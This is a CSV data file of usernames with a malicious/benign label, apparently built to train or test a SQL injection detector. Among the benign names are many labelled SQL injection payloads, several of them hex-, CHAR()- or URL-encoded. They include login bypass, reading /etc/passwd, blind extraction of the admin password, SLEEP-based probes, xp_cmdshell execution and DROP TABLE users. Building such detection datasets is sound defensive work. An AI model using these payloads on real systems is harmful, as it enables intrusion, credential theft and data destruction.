name,is_malicious
pyoung,0
arthurhill,0
jefferywilson,0
jordandaniel,0
olester,0
fernandezalexandra,0
wrightsarah,0
angel07,0
kyle66,0
glane,0
billymartin,0
xperez,0
rtorres,0
hrangel,0
jeffreywells,0
heidiortiz,0
hartamanda,0
xclayton,0
kwalters,0
whitelaura,0
michaelpeterson,0
alexandriahuffman,0
jameshenderson,0
terrellkatrina,0
michaelking,0
ayoung,0
daniel61,0
gkoch,0
marcus66,0
jwilliams,0
msmith,0
morristracy,0
patelpenny,0
robert47,0
millsmichele' OR 1=1--,1
wandarodriguez,0
robert66,0
zbarrett,0
annajones,0
' OR '1'='1,1
robert44,0
austinwalker,0
' OR 0x50=0x50--,1
david49,0
martinezheather,0
stephanie43,0
michelle04,0
jasonthomas,0
qmartinez,0
diana15,0
graypaul,0
mitchellzachary,0
jennifer58,0
sharonmendez,0
0x270x200x4f0x520x200x530x4f0x550x4e0x440x450x580x280x270x740x650x730x740x270x290x3d0x530x4f0x550x4e0x440x450x580x280x270x740x650x730x740x270x290x2d0x2d,1
grahammark,0
smallalbert,0
smithisabel,0
wendy18,0
qsilva,0
foxstephanie,0
gmurphy'||'1'='1,1
CHAR(39)CHAR(124)CHAR(124)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
jeffrey36,0
browndennis,0
elizabethmoreno,0
shieldsjoseph0x270x2f0x2a0x2a0x2f0x4f0x520x2f0x2a0x2a0x2f0x270x310x270x3d0x270x31,1
jennahuff,0
charlessilva'; EXEC xp_cmdshell('dir')--,1
richardpalmer,0
garzajasmine,0
kimhardy,0
carrillolance,0
wongshane' OR '1'='1,1
maldonadofrank,0
patrick44,0
santanadaniel,0
"eharper' OR BENCHMARK(10000000,MD5(NOW()))--",1
rebeccataylor,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
meltonnathaniel,0
paul83' OR 0x50=0x50--,1
judy74,0
brandymunoz' OR 1=1--,1
gregory92,0
arthur60,0
martinezmatthew,0
jbennett,0
bray,0
milleradam,0
joseph06,0
nathan85,0
robinsonmichael,0
lesliebennett,0
ajohnson,0
andersonmelinda,0
mark03' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
andrea64'%20OR%201=1--,1
traciecunningham,0
gomezjessica,0
mariavazquez,0
barrettkristie,0
cschultz,0
onorris'/**/OR/**/'1'='1,1
mccalljoseph,0
davidlindsey,0
john89,0
davidgarcia,0
vsilva,0
lphillips%27 %4f%52 %28%53%45%4c%45%43%54 %2a %46%52%4f%4d %28%53%45%4c%45%43%54%28%53%4c%45%45%50%28%35%29%29%29%62%41%4b%4c%29--,1
smithsean,0
andrew93,0
alicia53,0
calebbenson,0
"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
markgill,0
richardcastaneda,0
stacygreen,0
grosssherry,0
martinezgordon,0
qcochran,0
' OR 1=1--,1
kristinamiller,0
bthompson,0
dlong,0
'||'1'='1,1
tabithasimmons,0
ueaton,0
doris90,0
0x270x250x320x370x250x320x300x4f0x520x250x320x300x310x3d0x310x2d0x2d,1
lmyers,0
'%27%20OR%201=1--,1
'%27%20OR%201=1--,1
john08,0
phillip34,0
norrispatricia,0
emilybrown,0
lisa59CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(42)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(40)CHAR(83)CHAR(76)CHAR(69)CHAR(69)CHAR(80)CHAR(40)CHAR(53)CHAR(41)CHAR(41)CHAR(41)CHAR(98)CHAR(65)CHAR(75)CHAR(76)CHAR(41)CHAR(45)CHAR(45),1
jason35,0
karilynn,0
iwilliams%27 %4f%52 %43%48%41%52%28%34%39%29%3d%43%48%41%52%28%34%39%29--,1
johnsonmicheal,0
christina50,0
katherine43,0
margaret12,0
fstanton,0
anncrawford,0
amy10,0
kevinbarker,0
vdavis,0
tbeck,0
taylorsteven,0
kmyers,0
kristinewells' OR SOUNDEX('test')=SOUNDEX('test')--,1
wsummers,0
andersonsharon,0
wanda54,0
qhenson,0
staceyrice,0
garretthenderson,0
nrobles,0
qcervantes,0
gballard,0
sherrywallace,0
gardnerdawn,0
bellmelissa0x270x250x320x370x250x320x300x4f0x520x250x320x300x310x3d0x310x2d0x2d,1
adrianadaniels,0
averygabriela,0
amanda15,0
mark39,0
imartinez,0
christopherchung,0
brandoncollins,0
0x270x200x4f0x520x200x270x310x270x3d0x270x31,1
hallmichelle' OR 1=1--,1
matthew01,0
nancy21,0
jonesrebecca,0
oodom,0
lisaortiz,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(83)CHAR(79)CHAR(85)CHAR(78)CHAR(68)CHAR(69)CHAR(88)CHAR(40)CHAR(39)CHAR(116)CHAR(101)CHAR(115)CHAR(116)CHAR(39)CHAR(41)CHAR(61)CHAR(83)CHAR(79)CHAR(85)CHAR(78)CHAR(68)CHAR(69)CHAR(88)CHAR(40)CHAR(39)CHAR(116)CHAR(101)CHAR(115)CHAR(116)CHAR(39)CHAR(41)CHAR(45)CHAR(45),1
' OR CHAR(49)=CHAR(49)--,1
ruizmichelle,0
waltersrobert,0
brandonrodriguez,0
alexandercarson,0
tara00,0
sgarcia,0
jennifer34,0
charris,0
simmonsashley,0
ashleearnold,0
danielwoodward,0
woodmathew,0
rodgerskatelyn,0
solisgeoffrey,0
cochranjared,0
perry39,0
%27 %4f%52 %42%45%4e%43%48%4d%41%52%4b%28%31%30%30%30%30%30%30%30%2c%4d%44%35%28%4e%4f%57%28%29%29%29--,1
joseph57,0
alexanderjacobson,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
johnstonjerry,0
david51,0
xturner,0
allison62,0
ghunt,0
mhernandez,0
sarah59,0
syoung,0
lharrison,0
mooneybruce,0
petersmelanie,0
fcompton,0
davidhaas,0
tiffany03,0
faithwagner,0
xcampbell,0
' OR CHAR(49)=CHAR(49)--,1
roselisa,0
colin14,0
amanda75,0
freed,0
vanessahunt,0
michael03' OR 0x50=0x50--,1
' OR '1'='1,1
rachelramirez,0
0x270x7c0x7c0x270x310x270x3d0x270x31,1
nwilliams,0
rmoreno,0
robersonjulie,0
pamelabutler,0
lflores,0
rcabrera,0
alyssa86' OR CHAR(49)=CHAR(49)--,1
robertwhite,0
michelle42,0
vhanson,0
' OR BINARY 'a'='a'--,1
floresellen,0
joshua29,0
veronicawang,0
ocordova,0
michaelmorgan%27 %41%4e%44 %28%53%45%4c%45%43%54 %31 %46%52%4f%4d%28%53%45%4c%45%43%54 %43%4f%55%4e%54%28%2a%29%2c%43%4f%4e%43%41%54%28%30%78%33%61%2c%28%53%45%4c%45%43%54 %43%55%52%52%45%4e%54%5f%55%53%45%52%28%29%29%2c%30%78%33%61%2c%46%4c%4f%4f%52%28%52%41%4e%44%28%30%29%2a%32%29%29%78 %46%52%4f%4d %49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%50%4c%55%47%49%4e%53 %47%52%4f%55%50 %42%59 %78%29%61%29--,1
vaughnjesus,0
crystalking,0
anthony82,0
hfrost,0
tuckerjustin,0
brookepeters,0
jenniferlam,0
sheltonnicole,0
dhull' OR SOUNDEX('test')=SOUNDEX('test')--,1
kristen27,0
%27%2f%2a%2a%2f%4f%52%2f%2a%2a%2f%27%31%27%3d%27%31,1
christopherolsen,0
ballarddon' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
susanlawsonCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(42)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(40)CHAR(83)CHAR(76)CHAR(69)CHAR(69)CHAR(80)CHAR(40)CHAR(53)CHAR(41)CHAR(41)CHAR(41)CHAR(98)CHAR(65)CHAR(75)CHAR(76)CHAR(41)CHAR(45)CHAR(45),1
christopher36,0
jonesjeremy%27%2b%28%53%45%4c%45%43%54 %27%30%27 %46%52%4f%4d %75%73%65%72%73 %57%48%45%52%45 %75%73%65%72%6e%61%6d%65%3d%27%61%64%6d%69%6e%27 %41%4e%44 %53%55%42%53%54%52%49%4e%47%28%70%61%73%73%77%6f%72%64%2c%31%2c%31%29%3d%27%61%27%29%2b%27,1
dunlapthomas,0
colin01,0
jeffrey93,0
richardmolina,0
emily19,0
nicholassantiago,0
michael81,0
matthewbuckley,0
ellismanuel,0
christine66,0
tammy28,0
kimberly62%27 %55%4e%49%4f%4e %41%4c%4c %53%45%4c%45%43%54 %4c%4f%41%44%5f%46%49%4c%45%28%27%2f%65%74%63%2f%70%61%73%73%77%64%27%29--,1
levythomas,0
farleymichael,0
monica00' OR 0x50=0x50--,1
olambertCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(83)CHAR(79)CHAR(85)CHAR(78)CHAR(68)CHAR(69)CHAR(88)CHAR(40)CHAR(39)CHAR(116)CHAR(101)CHAR(115)CHAR(116)CHAR(39)CHAR(41)CHAR(61)CHAR(83)CHAR(79)CHAR(85)CHAR(78)CHAR(68)CHAR(69)CHAR(88)CHAR(40)CHAR(39)CHAR(116)CHAR(101)CHAR(115)CHAR(116)CHAR(39)CHAR(41)CHAR(45)CHAR(45),1
laura81,0
donaldmcintyre,0
meyercynthia,0
jamie09,0
wperry,0
josephjohnson,0
christopher55,0
travis42,0
jamesroy,0
claudiapatrick,0
kim37,0
benjamin82,0
cory92,0
ebenton,0
vday,0
tayloredwin,0
melissaparks,0
tiffany63,0
0x270x200x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x2a0x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d,1
rgraham,0
lisaweber,0
evansjustin,0
oliviamendez,0
bobbythomas,0
caroline88,0
tsimpson,0
andersonmonica,0
fweaver,0
medinachristopher,0
payneangela,0
micheal08,0
%27 %55%4e%49%4f%4e %41%4c%4c %53%45%4c%45%43%54 %4c%4f%41%44%5f%46%49%4c%45%28%27%2f%65%74%63%2f%70%61%73%73%77%64%27%29--,1
racheladams,0
milleramber,0
alexander51,0
eford,0
logannelson,0
cjones,0
richardsonpeter,0
mooremichael,0
"fullererika'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
christopher66,0
adamjones,0
danielsnyder,0
richardowens,0
rodriguezmark,0
royanthony,0
zgonzalez,0
tiffany80,0
norma24,0
mary11,0
wgardner,0
cindyflores,0
marybrewer,0
glopez,0
amandapope,0
andersonkelly,0
pereznicole,0
gbenson,0
jessicawolfe,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
dannypearson,0
megan27,0
gouldkirk,0
lberry,0
gregoryellis,0
andrew09,0
bwheeler,0
megancarpenter,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(66)CHAR(69)CHAR(78)CHAR(67)CHAR(72)CHAR(77)CHAR(65)CHAR(82)CHAR(75)CHAR(40)CHAR(49)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(44)CHAR(77)CHAR(68)CHAR(53)CHAR(40)CHAR(78)CHAR(79)CHAR(87)CHAR(40)CHAR(41)CHAR(41)CHAR(41)CHAR(45)CHAR(45),1
wgilmore,0
wperez,0
patrickdennis,0
rodriguezveronica,0
wilsonamy,0
melissa44,0
samuel38%27 %55%4e%49%4f%4e %41%4c%4c %53%45%4c%45%43%54 %4c%4f%41%44%5f%46%49%4c%45%28%27%2f%65%74%63%2f%70%61%73%73%77%64%27%29--,1
xbarnes,0
ohahn,0
ricardo31,0
pattersonnicole,0
fguzman,0
thomasjohnson,0
janice22,0
richard94,0
daniel90,0
daniel13,0
robert29,0
nallen'/**/OR/**/'1'='1,1
kbeck,0
jacksoncharles,0
martinpaula0x270x200x4f0x520x200x530x4f0x550x4e0x440x450x580x280x270x740x650x730x740x270x290x3d0x530x4f0x550x4e0x440x450x580x280x270x740x650x730x740x270x290x2d0x2d,1
clayton39,0
dgarcia,0
henryjacqueline,0
davisdawn,0
charlescarol,0
qbates,0
cobbangela,0
hlopez,0
wlopez,0
michael71,0
cbrown,0
scott77,0
%27%3b %44%52%4f%50 %54%41%42%4c%45 %75%73%65%72%73--,1
haasjonathan,0
zjohnson,0
shawn14,0
sjackson,0
allencraig,0
tommcdaniel,0
davidpowell,0
powerscaroline,0
theresaramirez,0
hwallace,0
ryanangela,0
david07,0
npeterson,0
belindabailey,0
0x270x250x320x370x250x320x300x4f0x520x250x320x300x310x3d0x310x2d0x2d,1
CHAR(39)CHAR(37)CHAR(50)CHAR(48)CHAR(79)CHAR(82)CHAR(37)CHAR(50)CHAR(48)CHAR(49)CHAR(61)CHAR(49)CHAR(45)CHAR(45),1
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
faith40,0
jameswilkinson,0
jamesdavid,0
qwalsh,0
raymondjones,0
gomezlinda,0
james56,0
'||'1'='1,1
romerohannah,0
lhiggins,0
brentscott,0
felicia32,0
derrick46,0
jonathan92,0
'; EXEC xp_cmdshell('dir')--,1
kleinjustin,0
kaylawilliams,0
graykyle,0
ischroeder' OR 1=1--,1
charles21,0
mariah76,0
tgutierrez,0
krivera,0
gabriel34,0
ryan42CHAR(39)CHAR(59)CHAR(32)CHAR(69)CHAR(88)CHAR(69)CHAR(67)CHAR(32)CHAR(120)CHAR(112)CHAR(95)CHAR(99)CHAR(109)CHAR(100)CHAR(115)CHAR(104)CHAR(101)CHAR(108)CHAR(108)CHAR(40)CHAR(39)CHAR(100)CHAR(105)CHAR(114)CHAR(39)CHAR(41)CHAR(45)CHAR(45),1
david60,0
pmiller,0
nicholas29,0
karroyo,0
ujacobs,0
andersonrebecca,0
nicholasrodriguez,0
ashleyrandall,0
nroberts'; DROP TABLE users--,1
qrochaCHAR(39)CHAR(32)CHAR(85)CHAR(78)CHAR(73)CHAR(79)CHAR(78)CHAR(32)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(42)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(115)CHAR(45)CHAR(45),1
hansonangela' UNION SELECT * FROM users--,1
jhogan0x270x200x4f0x520x200x530x4f0x550x4e0x440x450x580x280x270x740x650x730x740x270x290x3d0x530x4f0x550x4e0x440x450x580x280x270x740x650x730x740x270x290x2d0x2d,1
oolson,0
qcooper,0
' OR CHAR(49)=CHAR(49)--,1
karen20,0
harrissheila,0
aroman,0
hilltravis,0
ambergordon,0
jodihuber,0
burkenancy,0
piercekyle%27 %4f%52 %42%49%4e%41%52%59 %27%61%27%3d%27%61%27--,1
geraldedwards,0
connie04,0
hgreen,0
dawnbrown,0
0x270x2b0x280x530x450x4c0x450x430x540x200x270x300x270x200x460x520x4f0x4d0x200x750x730x650x720x730x200x570x480x450x520x450x200x750x730x650x720x6e0x610x6d0x650x3d0x270x610x640x6d0x690x6e0x270x200x410x4e0x440x200x530x550x420x530x540x520x490x4e0x470x280x700x610x730x730x770x6f0x720x640x2c0x310x2c0x310x290x3d0x270x610x270x290x2b0x27,1
tamaratrevino' OR '1'='1,1
alicia66,0
dawnvance'/**/OR/**/'1'='1,1
qbrown,0
michaelflores,0
amullins,0
patrick53,0
dyersally,0
qdavis,0
thomasmadden,0
johnsonvictoria0x270x200x4f0x520x200x430x480x410x520x280x340x390x290x3d0x430x480x410x520x280x340x390x290x2d0x2d,1
hschneider%27%7c%7c%27%31%27%3d%27%31,1
mitchellamanda,0
matthewhaley,0
jeffreygonzalez,0
' OR CHAR(49)=CHAR(49)--,1
"owolf'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
frostautumn,0
donnawood,0
aarondavila,0
rmaddox,0
pattersonjesus,0
marywilsonCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(42)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(40)CHAR(83)CHAR(76)CHAR(69)CHAR(69)CHAR(80)CHAR(40)CHAR(53)CHAR(41)CHAR(41)CHAR(41)CHAR(98)CHAR(65)CHAR(75)CHAR(76)CHAR(41)CHAR(45)CHAR(45),1
clarkterri,0
perrymelissa,0
irivera,0
samantha45,0
rileyjeffrey,0
christinawood,0
michael69,0
davisdonald,0
ryan44,0
underwoodmark,0
carolynchoi,0
' OR SOUNDEX('test')=SOUNDEX('test')--,1
erikcarter,0
alicia49,0
misty52,0
misty40,0
gregorythompson,0
adavis,0
croman' UNION SELECT * FROM users--,1
' OR '1'='1,1
amandakerr,0
mjohnson,0
zacharyyang,0
ijohnson,0
tnolan,0
wendybenton,0
moralesjessica,0
tnolan,0
bbanks,0
yrodriguez,0
'; DROP TABLE users--,1
heather17,0
bturner,0
njohnson,0
njones,0
petersonmelissa,0
'; DROP TABLE users--,1
awhite,0
elliottdawn,0
juanbass,0
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
' OR '1'='1,1
robin81,0
rogerskenneth,0
robertzimmerman,0
'%20OR%201=1--,1
lisabrown' OR SOUNDEX('test')=SOUNDEX('test')--,1
stephensonjames,0
burtonsamantha,0
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
dawn04' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
sharicontreras,0
livingstondaniel,0
CHAR(39)CHAR(32)CHAR(65)CHAR(78)CHAR(68)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(49)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(67)CHAR(79)CHAR(85)CHAR(78)CHAR(84)CHAR(40)CHAR(42)CHAR(41)CHAR(44)CHAR(67)CHAR(79)CHAR(78)CHAR(67)CHAR(65)CHAR(84)CHAR(40)CHAR(48)CHAR(120)CHAR(51)CHAR(97)CHAR(44)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(67)CHAR(85)CHAR(82)CHAR(82)CHAR(69)CHAR(78)CHAR(84)CHAR(95)CHAR(85)CHAR(83)CHAR(69)CHAR(82)CHAR(40)CHAR(41)CHAR(41)CHAR(44)CHAR(48)CHAR(120)CHAR(51)CHAR(97)CHAR(44)CHAR(70)CHAR(76)CHAR(79)CHAR(79)CHAR(82)CHAR(40)CHAR(82)CHAR(65)CHAR(78)CHAR(68)CHAR(40)CHAR(48)CHAR(41)CHAR(42)CHAR(50)CHAR(41)CHAR(41)CHAR(120)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(73)CHAR(78)CHAR(70)CHAR(79)CHAR(82)CHAR(77)CHAR(65)CHAR(84)CHAR(73)CHAR(79)CHAR(78)CHAR(95)CHAR(83)CHAR(67)CHAR(72)CHAR(69)CHAR(77)CHAR(65)CHAR(46)CHAR(80)CHAR(76)CHAR(85)CHAR(71)CHAR(73)CHAR(78)CHAR(83)CHAR(32)CHAR(71)CHAR(82)CHAR(79)CHAR(85)CHAR(80)CHAR(32)CHAR(66)CHAR(89)CHAR(32)CHAR(120)CHAR(41)CHAR(97)CHAR(41)CHAR(45)CHAR(45),1
mcneilabigail,0
josephwilliams,0
carriemartinez,0
cynthiamata,0
arthurbanks,0
robertsmith,0
rtucker,0
wramirez,0
sbender,0
0x270x200x550x4e0x490x4f0x4e0x200x410x4c0x4c0x200x530x450x4c0x450x430x540x200x4c0x4f0x410x440x5f0x460x490x4c0x450x280x270x2f0x650x740x630x2f0x700x610x730x730x770x640x270x290x2d0x2d,1
joshua12,0
' OR BINARY 'a'='a'--,1
gary54CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(66)CHAR(69)CHAR(78)CHAR(67)CHAR(72)CHAR(77)CHAR(65)CHAR(82)CHAR(75)CHAR(40)CHAR(49)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(44)CHAR(77)CHAR(68)CHAR(53)CHAR(40)CHAR(78)CHAR(79)CHAR(87)CHAR(40)CHAR(41)CHAR(41)CHAR(41)CHAR(45)CHAR(45),1
michelleford,0
james33'||'1'='1,1
tara66,0
dmarshall,0
fuenteselizabeth,0
jchavez,0
mallory92,0
jacquelinehopkins,0
'%27%20OR%201=1--,1
carriesuarez,0
tcochran,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
steven73,0
crystal90,0
iwelch,0
elizabeth34,0
'%27%20OR%201=1--,1
robert12,0
aliciarogers,0
oscarbeck,0
stevenschroeder,0
zhernandez'%20OR%201=1--,1
boothjacob,0
wheelerjeff,0
katherineperezCHAR(39)CHAR(43)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(39)CHAR(48)CHAR(39)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(115)CHAR(32)CHAR(87)CHAR(72)CHAR(69)CHAR(82)CHAR(69)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(110)CHAR(97)CHAR(109)CHAR(101)CHAR(61)CHAR(39)CHAR(97)CHAR(100)CHAR(109)CHAR(105)CHAR(110)CHAR(39)CHAR(32)CHAR(65)CHAR(78)CHAR(68)CHAR(32)CHAR(83)CHAR(85)CHAR(66)CHAR(83)CHAR(84)CHAR(82)CHAR(73)CHAR(78)CHAR(71)CHAR(40)CHAR(112)CHAR(97)CHAR(115)CHAR(115)CHAR(119)CHAR(111)CHAR(114)CHAR(100)CHAR(44)CHAR(49)CHAR(44)CHAR(49)CHAR(41)CHAR(61)CHAR(39)CHAR(97)CHAR(39)CHAR(41)CHAR(43)CHAR(39),1
erika62,0
' OR '1'='1,1
cheyenneadams,0
barrettdonna,0
nlopez,0
jeremyperez,0
knightpeggy,0
aaronlopez,0
' OR '1'='1,1
margaretgarcia,0
kellytamara,0
danielwallace,0
crystalgarcia,0
jessica08,0
nguyenkimberly,0
jacob31,0
hclements,0
rogerschristopher,0
williambutler,0
christopher31,0
jeffreyshort,0
morenomicheal,0
cummingstina,0
' OR 0x50=0x50--,1
uriley,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
kjones,0
amy63,0
kevinlopez,0
oharris,0
lori21,0
leebrandon,0
lpalmer,0
russonathaniel,0
jasminehansen,0
melindamitchell,0
suzannemiller,0
scott54,0
myersrichard,0
'; DROP TABLE users--,1
sean86,0
don94,0
kerrimoran,0
cwilson,0
jacquelineunderwood,0
mccarthylindsey,0
normanrobert,0
lcampbell,0
carneysusan,0
christopher91,0
ricky54,0
dianabooker,0
bjackson,0
vhernandez,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
angelicamorris,0
baileymartinez' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
jeff27,0
hallbreanna,0
mnguyen,0
kevin67,0
tgraves,0
zmarsh,0
pharris,0
johnsoncindy,0
dwalters,0
randall50,0
fsantiago,0
wward,0
jessicaballard,0
ccarpenter,0
sandrakramer,0
perrychristopher' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
nicholashughes,0
douglas00,0
milesjoel,0
bellnathaniel,0
tswanson,0
lisa24,0
jensenashley,0
kellyprince,0
scampbell'%27%20OR%201=1--,1
jonathan37,0
amandareid,0
tonyrandolph,0
waynemartin,0
hilldavid,0
hutchinsonmonique,0
urusso,0
michellewilliams,0
petersonsamantha,0
ashleycantu,0
whitedonna,0
johnjones'/**/OR/**/'1'='1,1
walkerelizabeth'/**/OR/**/'1'='1,1
tracy12' OR BINARY 'a'='a'--,1
piercedavid,0
dorseylaurie' OR SOUNDEX('test')=SOUNDEX('test')--,1
edwinmoore,0
ericmeyer,0
beckyholden,0
%27 %41%4e%44 %28%53%45%4c%45%43%54 %31 %46%52%4f%4d%28%53%45%4c%45%43%54 %43%4f%55%4e%54%28%2a%29%2c%43%4f%4e%43%41%54%28%30%78%33%61%2c%28%53%45%4c%45%43%54 %43%55%52%52%45%4e%54%5f%55%53%45%52%28%29%29%2c%30%78%33%61%2c%46%4c%4f%4f%52%28%52%41%4e%44%28%30%29%2a%32%29%29%78 %46%52%4f%4d %49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%50%4c%55%47%49%4e%53 %47%52%4f%55%50 %42%59 %78%29%61%29--,1
rpark,0
garciajoseph,0
megan15,0
welchsusan,0
middletonandrew,0
mortonmadison,0
fbailey,0
' UNION SELECT * FROM users--,1
'%27%20OR%201=1--,1
mallen,0
%27%3b %45%58%45%43 %78%70%5f%63%6d%64%73%68%65%6c%6c%28%27%64%69%72%27%29--,1
jennifermartin,0
shelbywalter,0
dcampbell,0
antonio83,0
' OR 1=1--,1
shawnwhiteCHAR(39)CHAR(43)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(39)CHAR(48)CHAR(39)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(115)CHAR(32)CHAR(87)CHAR(72)CHAR(69)CHAR(82)CHAR(69)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(110)CHAR(97)CHAR(109)CHAR(101)CHAR(61)CHAR(39)CHAR(97)CHAR(100)CHAR(109)CHAR(105)CHAR(110)CHAR(39)CHAR(32)CHAR(65)CHAR(78)CHAR(68)CHAR(32)CHAR(83)CHAR(85)CHAR(66)CHAR(83)CHAR(84)CHAR(82)CHAR(73)CHAR(78)CHAR(71)CHAR(40)CHAR(112)CHAR(97)CHAR(115)CHAR(115)CHAR(119)CHAR(111)CHAR(114)CHAR(100)CHAR(44)CHAR(49)CHAR(44)CHAR(49)CHAR(41)CHAR(61)CHAR(39)CHAR(97)CHAR(39)CHAR(41)CHAR(43)CHAR(39),1
jesse69'%20OR%201=1--,1
jonathan71,0
brittanyriddle,0
cynthiacummings0x270x200x4f0x520x200x430x480x410x520x280x340x390x290x3d0x430x480x410x520x280x340x390x290x2d0x2d,1
jamesconley,0
alawrence,0
scottkelley,0
debbiehamilton,0
kylemoreno,0
davidfarmer,0
0x270x3b0x200x440x520x4f0x500x200x540x410x420x4c0x450x200x750x730x650x720x730x2d0x2d,1
